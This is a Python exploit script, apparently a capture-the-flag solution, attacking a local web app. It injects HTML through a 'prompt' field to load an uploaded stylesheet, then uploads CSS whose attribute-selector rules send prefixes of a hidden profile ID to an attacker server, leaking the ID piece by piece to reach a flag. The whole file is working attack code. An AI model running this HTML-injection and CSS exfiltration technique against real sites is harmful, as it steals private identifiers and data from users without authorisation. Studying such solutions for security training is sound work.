from requests import Session
import io
from bs4 import BeautifulSoup

s = Session()

BASE_URL = 'http://localhost:3000'

ATTACKER_URL = 'http://localhost:3001'

username = '95e308b1'
print('[+] Username:', username)

soup = BeautifulSoup(s.post(f'{BASE_URL}/register', json={'username': username, 'password': 'x', 'confirm': 'x'}).text, 'html.parser')
# soup = BeautifulSoup(s.post(f'{BASE_URL}/login', json={'username': username, 'password': 'x'}).text, 'html.parser')

user_id = soup.find_all('a')[2]['href'].split('/')[-1]
print('[+] User ID:', user_id)

x = s.post(f'{BASE_URL}/make', json={
    'prompt': f'L</title><link rel="stylesheet" href="/uploads/{user_id}.css"><title>',
    'punchline': 'ur mom lmao'
})
injection_url = x.url
print('[+] Report URL:', injection_url)

def generate(prefix):
    ALLOWED = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
    args = [ prefix + c1 + c2 for c1 in ALLOWED for c2 in ALLOWED ]
    out = ''
    for a in args:
        out += f"""
        a[href^="/profile/{a}"] {{
            background-image: url("{ATTACKER_URL}/?x={a}")
        }}
        """

    return out

def find_letters(found):
    file = io.BytesIO(generate(found).encode())
    file.name = 'style.css'
    x = s.post(f'{BASE_URL}/profile/edit', data={'confirm': 'x'}, files={
        'pfp': file
    })

    file.close()

    return input('[?] Found ID: ')

if __name__ == '__main__':

    id = ''

    while len(id) < 8:
        id = find_letters(id)

        print(id)
    print(f'[+] Flag is at {BASE_URL}/profile/{id}')
